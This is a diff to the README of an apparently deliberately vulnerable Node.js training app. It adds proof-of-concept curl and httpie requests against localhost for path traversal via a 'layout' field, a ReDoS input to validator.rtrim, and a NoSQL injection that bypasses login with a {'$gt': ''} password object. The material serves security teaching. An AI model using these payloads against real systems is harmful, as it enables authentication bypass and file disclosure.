@@ -14,7 +14,7 @@ This vulnerable app includes the following capabilities to experiment with:
 ```bash
 mongod &
 
-git clone https://github.com/Snyk/snyk-demo-todo
+git clone https://github.com/snyk/goof.git
 npm install
 npm start
 ```
@@ -77,7 +77,11 @@ The form is completely functional. The way it works is, it receives the profile 
 You'd think that what's the worst that can happen because we use a validation to confirm the expected input, however the validation doesn't take into account a new field that can be added to the object, such as `layout`, which when passed to a template language, could lead to Local File Inclusion (Path Traversal) vulnerabilities. Here is a proof-of-concept showing it:
 
 ```sh
-curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{"layout": "./../package.json"}' 'http://localhost:3001/account_details'
+curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"username": "admin@snyk.io", "password": "SuperSecretPassword"}' 'http://localhost:3001/login'
+```
+
+```sh
+curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"email": "admin@snyk.io", "firstname": "admin", "lastname": "admin", "country": "IL", "phone": "+972551234123",  "layout": "./../package.json"}' 'http://localhost:3001/account_details'
 ```
 
 Actually, there's even another vulnerability in this code.
@@ -92,6 +96,31 @@ The `validator.rtrim()` sanitizer is also vulnerable, and we can use this to cre
 ```sh
 curl -X 'POST' -H 'Content-Type: application/json' --data-binary "{\"email\": \"someone@example.com\", \"country\": \"nop\", \"phone\": \"0501234123\", \"lastname\": \"nop\", \"firstname\": \"`node -e 'console.log(" ".repeat(100000) + "!")'`\"}" 'http://localhost:3001/account_details'
 ```
+
+#### NoSQL injection
+
+A POST request to `/login` will allow for authentication and signing-in to the system as an administrator user.
+It works by exposing `loginHandler` as a controller in `routes/index.js` and uses a MongoDB database and the `User.find()` query to look up the user's details (email as a username and password). One issue is that it indeed stores passwords in plaintext and not hashing them. However, there are other issues in play here.
+
+
+We can send a request with an incorrect password to see that we get a failed attempt
+```sh
+echo '{"username":"admin@snyk.io", "password":"WrongPassword"}' | http --json $GOOF_HOST/login -v
+```
+
+And another request, as denoted with the following JSON request to sign-in as the admin user works as expected:
+```sh
+echo '{"username":"admin@snyk.io", "password":"SuperSecretPassword"}' | http --json $GOOF_HOST/login -v
+```
+
+However, what if the password wasn't a string? what if it was an object? Why would an object be harmful or even considered an issue?
+Consider the following request:
+```sh
+echo '{"username": "admin@snyk.io", "password": {"$gt": ""}}' | http --json $GOOF_HOST/login -v
+```
+
+We know the username, and we pass on what seems to be an object of some sort.
+That object structure is passed as-is to the `password` property and has a specific meaning to MongoDB - it uses the `$gt` operation which stands for `greater than`. So, we in essence tell MongoDB to match that username with any record that has a password that is greater than `empty string` which is bound to hit a record. This introduces the NoSQL Injection vector.
 
 #### Open redirect
 
